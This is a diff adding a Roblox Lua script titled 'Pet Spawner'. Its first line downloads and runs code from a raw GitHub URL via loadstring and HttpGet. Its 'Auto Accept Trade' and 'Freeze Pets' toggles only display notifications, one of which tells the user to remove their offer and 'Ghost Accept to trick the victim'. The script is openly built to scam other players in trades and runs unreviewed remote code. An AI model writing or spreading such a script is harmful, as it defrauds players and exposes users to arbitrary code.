@@ -1,0 +1,28 @@
+local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/random%202"))()
+local uiWindow = library:Window("Pet Spawner")
+
+local function sendNotification(title, text)
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = title,
+        Text = text,
+        Duration = 3
+    })
+end
+
+-- Button to execute the trade logic (Auto Accept Trade)
+uiWindow:Toggle("Auto Accept Trade", function(state)
+    if state then
+        sendNotification("Trade Confirmed", "Trade has been auto-accepted.")
+    else
+        sendNotification("Trade Disabled", "You clicked 'Auto Accept Trade'. Auto trade acceptance is now disabled.")
+    end
+end)
+
+-- Button to execute the freeze logic (freeze the pet, no changes allowed)
+uiWindow:Toggle("Freeze Pets", function(state)
+    if state then
+        sendNotification("Trade Locked", "Trade is locked. You can now remove your offer and click the Ghost Accept to trick the victim.")
+    else
+        sendNotification("Unfreeze", "You clicked 'Unfreeze Pets'. Pets are now unfrozen.")
+    end
+end)
